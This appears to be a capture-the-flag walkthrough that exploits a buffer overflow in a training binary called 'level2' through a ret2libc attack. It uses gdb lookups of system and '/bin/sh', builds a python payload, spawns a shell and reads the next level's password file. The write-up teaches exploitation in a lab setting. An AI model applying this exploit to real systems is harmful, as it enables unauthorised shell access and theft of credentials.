- After running the program, we found that it read from the stdin.

- We checked if we can do a buffer overflow, so we tried to enter a big string with more than 100 chars.

$> ./level2
testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
Segmentation fault (core dumped)

- Good, so now we need to calculate the buffer size, to do that we will use this website (https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)

- We found the buffer size is = 80

- Unfortunately, at this level, we don't have a defined function to call it, for that we will use an attack called ret2libc.

- In this attack, we need to call the system function from the C library and pass the "/bin/sh" to this function

$> gdb ./level2
gdb> b main
gdb> r
gdb> p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

- Now, We need 2 more things, a fake return address and an argument to pass to system("/bin/sh")

- To get the "/bin/sh" string to pass in, were going to have find it inside of libc

gdb> find &system, +9999999, "/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.

- Now, we need to make the payload for exploiting with this format.

buffer + return addr + system func + fake return address + "/bin/sh" from libc

$> (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7'") > /tmp/payload

$> cat /tmp/payload - | ./level2
> cat /home/user/level3/.pass

# also you can make a python script to make this process easy.